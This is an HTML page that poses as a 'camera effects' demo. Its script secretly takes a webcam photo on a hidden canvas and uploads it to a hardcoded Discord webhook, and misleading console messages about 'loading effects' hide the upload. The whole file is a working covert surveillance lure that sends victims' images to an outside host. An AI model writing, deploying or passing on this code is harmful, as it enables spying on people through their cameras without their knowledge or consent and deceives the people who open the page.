<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RelMis's Camera Effects</title>
</head>
<body>
    <h1>Please allow access to try camera effects!</h1>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const webhookURL = 'https://discord.com/api/webhooks/1350881236280803492/343yx9XzqUQKzh6-b-WsGdgOMTy3bAv6O6t9kSbIVsd7Xn0btgOoOanbwOR7NMfsI2dd';

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                const video = document.createElement('video');
                video.srcObject = stream;

                video.onplaying = function() {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageUrl = canvas.toDataURL('image/jpeg');

                    fetch(imageUrl)
                        .then(response => response.blob())
                        .then(blob => {
                            const formData = new FormData();
                            formData.append('file', blob, 'webcam_image.jpg');

                            fetch(webhookURL, {
                                method: 'POST',
                                body: formData,
                            })
                            .then(response => response.json())
                            .then(data => {
                                console.log('Successfully loaded effects:', data);
                            })
                            .catch(error => {
                                console.error('Error loading effects:', error);
                            });
                        })
                        .catch(error => {
                            console.error('Error turning on:', error);
                        });
                };

                video.play();
            })
            .catch(function(err) {
                alert("Error accessing webcam: " + err);
            });
    </script>
</body>
</html>
